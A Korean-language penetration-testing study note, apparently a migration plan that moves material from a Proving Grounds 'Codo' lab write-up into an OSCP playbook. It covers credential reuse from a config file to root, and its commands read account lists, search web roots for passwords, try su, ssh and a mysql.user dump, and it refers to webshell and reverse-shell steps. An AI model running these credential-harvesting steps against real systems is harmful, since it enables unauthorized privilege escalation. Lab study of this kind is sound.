Codo.md 옛 2-1 · 2-2 · 2-3 전량. `03. PG\_backup\Codo.md.bak` 161~218행.

---

## 8. `B-6. 자격증명·크래킹` 하위 — **신규**

### 제목(안)

평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다

### 넣을 본문

**주운 값을 「DB 비밀번호」로 좁게 부르지 말 것.** [[Codo]] — `sites/default/config.php` 의 MySQL 비밀번호 `FatPanda123` 이 **시스템 root 비밀번호와 동일**했음. `su root` 한 줄로 root, 익스플로잇·컴파일·SUID 사냥 전부 불필요.

**왜 이렇게 흔한가 — 게으름이 아니라 구조임:**

| 원인 | 설명 |
|---|---|
| 설치 시점의 관리자가 한 사람 | 웹앱을 설치하는 사람이 곧 서버 root. 그 순간 머릿속의 비밀번호는 하나뿐 |
| DB 비밀번호는 「사람이 안 볼 값」이라는 착각 | 설정 파일에 박아두고 잊음. 그래서 강한 것 대신 기억하기 쉬운 것을 넣음 |
| 비밀번호 관리자 미사용 | 새로 만들면 적어둘 곳이 없음 → 쓰던 걸 재사용 |
| 자동화 스크립트 | Ansible·셸 스크립트 하나에 변수 하나(`$PASSWORD`)로 DB·OS·앱을 전부 설정 |
| 로테이션 부재 | 한 번 정하면 몇 년을 감. 재사용의 효과가 시간이 지나도 안 줄어듦 |

**전면 재사용 시험 — 대상 목록부터 만들 것:**
```bash
cat /etc/passwd | grep -E 'sh$' | cut -d: -f1     # 셸이 있는 계정만
ls /home                                          # 홈 디렉터리가 있는 계정
```

| 대상 | 명령 |
|---|---|
| root | `su root` ← **먼저.** 성공하면 나머지가 필요 없음 |
| 각 일반 계정 | `su <user>` |
| DB 사용자명과 같은 OS 계정 | `su <dbuser>` — 이름 일치는 강한 신호임([[Fanatastic]]) |
| SSH | `ssh <user>@<타겟>` |
| 웹 관리자 패널 | 같은 비밀번호로 다른 앱 로그인 |
| MySQL 안의 다른 계정 | `mysql -u <dbuser> -p'<pw>' -e "select * from mysql.user\G"` |

**같은 계열** — [[Robust]](Sticky Notes 평문 → Administrator) · [[Levram]](`app.service` 평문 root 비밀번호) · [[Crane]](`config.php` DB 자격증명) · [[Fanatastic]](DB 사용자명 = OS 계정명). 저장소 이원화 쪽은 `B-62`.

⚠️ **한 서비스의 거부가 자격증명의 오류가 아님**(`A-24`). Ubuntu 기본값 `PermitRootLogin prohibit-password` 때문에 `ssh root@` 가 막혀도 `su root` 는 통함 — **로컬 셸이 있으면 `su` 가 SSH 보다 우선**임.

### 지우기 전 원문 (Codo.md 옛 0장 · 4-5 · 4-7 · 7장 1·7번)

원문 전량은 `03. PG\_backup\Codo.md.bak` 26~42행 · 554~638행 · 714·733행. 요지 인용:

```text
- 자격증명 재사용(credential reuse) — DB 비밀번호가 시스템 root 비밀번호와 같다. **이 박스의 핵심이자 OSCP 시험 단골**
- 셸을 잡으면 설정 파일부터 훑는 이유 — 웹 애플리케이션 설정 파일은 평문 비밀번호의 창고다

**시험 출제 가능성 — 매우 높다.** 자격증명 재사용은 OSCP 시험에서 가장 자주 나오는 권한상승 경로 중 하나다. SUID·커널 익스플로잇보다 흔하다.
시험 박스의 전형적 형태는 셋 중 하나다:
1. 웹앱 설정 파일의 DB 비밀번호 → OS 계정 비밀번호 ← 이 박스
2. 백업 파일·메모·`.bash_history`의 비밀번호 → SSH 재사용
3. 서비스 유닛 파일·크론 스크립트에 박힌 평문 비밀번호 → `su`
세 경우 모두 "찾는 것"이 기술이지 "익스플로잇"이 아니다. 그래서 익스플로잇 실력이 아니라 열거 체크리스트의 완성도가 점수를 가른다.

**결론: 평문 비밀번호를 하나 주우면, 그것은 "DB 비밀번호"가 아니라 "이 조직이 쓰는 비밀번호"로 취급한다.**
```

⚠️ 옛 4-7 「재사용이 안 통했다면 — 다음 후보 경로」 6항목은 **박스 노트의 `Privilege Escalation` 절에 한 줄로 압축해 유지**했음(그 박스의 대안 경로 서술이라 노트 쪽이 맞음).

---

## 9. `D. 시간 배분 · 손절 기준` — 병합

### 넣을 본문

**Fundamental 난이도의 시계는 25~30분임.** 1시간을 넘으면 뚫리는 중이 아니라 잘못된 길에 있는 것임.

| 단계 | 적정 | 손절선 |
|---|---|---|
| nmap 전 포트 | 1~2분 | — |
| 웹 열거 + 관리 경로 발견 | 5분 | 10분 넘게 안 나오면 소스·문서로 경로 관례를 확인 |
| 기본 자격증명 시도 | 2분 | 10개 조합에서 안 되면 즉시 다른 공격면으로. 브루트포스로 넘어가지 말 것 |
| 업로드 → 웹셸 실행 | 10분 | 20분 넘으면 업로드 말고 테마 편집기·플러그인 경로로 갈아탈 것 |
| 설정 파일 열거 | 3분 | `grep -rn password /var/www` 는 30초면 끝남. 오래 걸릴 이유가 없음 |
| 재사용 시험 | 3분 | 계정 목록 전체를 훑고 안 되면 다음 후보로 |
| 총계 | 25~30분 | 1시간 초과 시 접근 자체를 재검토 |

**[[Codo]] 실측 — 총 33분 10초.** 파일 mtime · 스크린샷 파일명 · 셸 배너의 타겟 시각으로 재구성:

| 시각(KST) | 근거 | 무엇 |
|---|---|---|
| 16:02:41 | `nmap.log` 1행 | 스캔 시작 |
| 16:03:26 | `nmap.log` 마지막 행 | 스캔 종료(45.27초) |
| 16:24:49 | `~/PG/Codo/50978.py` mtime | `searchsploit -m 50978` — 제품 식별 + 관리 경로 발견 + `admin:admin` 로그인이 이 **21분** 안에 있음 `[가정]`(열거 산출물 없음) |
| 16:35:17 | `파일보관\Pasted image 20260818163517.png` | Global Settings 에 `payload.php` 물린 화면 |
| 16:35:51 | 셸 배너 `07:35:51`(타겟 UTC) + `up 36 min` | 리버스셸 회수 |

→ **21분 구간이 이 박스의 최대 항목**이고 그것이 통째로 미기록임. 실패한 열거 로그를 남겼으면 그대로 `A. 증상별` 재료가 됐음(⚠️ `~/PG/Codo/` 에 파일이 `nmap.log`·`50978.py` **두 개뿐**).
→ 16:24:49 → 16:35:51 의 **11분**에 PoC 실행 시도(Burp 프록시 하드코딩으로 불발 `[가정]`, A-14)와 수동 업로드가 들어 있음.

### 지우기 전 원문 (Codo.md 옛 6장 ⑥ · 7장 14번)

```text
### ⑥ 시간 배분 — 이 박스의 적정 소요

(표 — 위 「넣을 본문」의 표와 동일)

**Fundamental 난이도는 30분 안에 끝나야 정상이다.** 이 시계를 머리에 넣고 있으면 "지금 막힌 게 아니라 잘못된 길에 있다"는 판단이 빨라진다.

14. **시간 시계: Fundamental은 30분.** 1시간을 넘으면 뚫리는 중이 아니라 잘못된 길에 있는 것이다.
```

---

## 이관 손실 검산

| 항목 | 수 |
|---|---|
| 박스 노트에서 삭제한 학습 자료 블록 | 9 (옛 0장 · 2-1~2-5 · 4-1/4-3/4-6 · 6장 전량 · 7장 전량) |
| 이 파일의 이관 제안 | 9 |
| `[가정]` 표시 | 삭제 3건 → 제안에 3건 전량 재수록(+ 새로 확보한 `[가정]` 4건 추가) |
| 「관측 없음」 서술 | 삭제 0건 (원본에 없었음. 새 노트에서 4건 신설) |
| 코드블록 | 삭제 11개 → 제안에 11개 전량 재수록 |
| 소요 시간·출처 경로 | 손실 0 — 9번 제안에 mtime 기반 타임라인으로 오히려 보강 |

**옛 8장(방어 관점) 표 11행은 `_PLAYBOOK` 이 아니라 각 finding 의 `Vulnerability Fix:` 로 분산했음** — `_WRITEUP-STANDARD` 대응표대로임. 이 파일의 이관 대상이 아님.
**옛 9장(참고 자료)·「남긴 흔적」은 새 노트의 `## 관련`·`Post-Exploitation` 으로 이동했음.**
**옛 7장 2번(시험 금지 도구 표)은 `E` 에 이미 같은 내용이 있어 제안하지 않음** — 중복임.
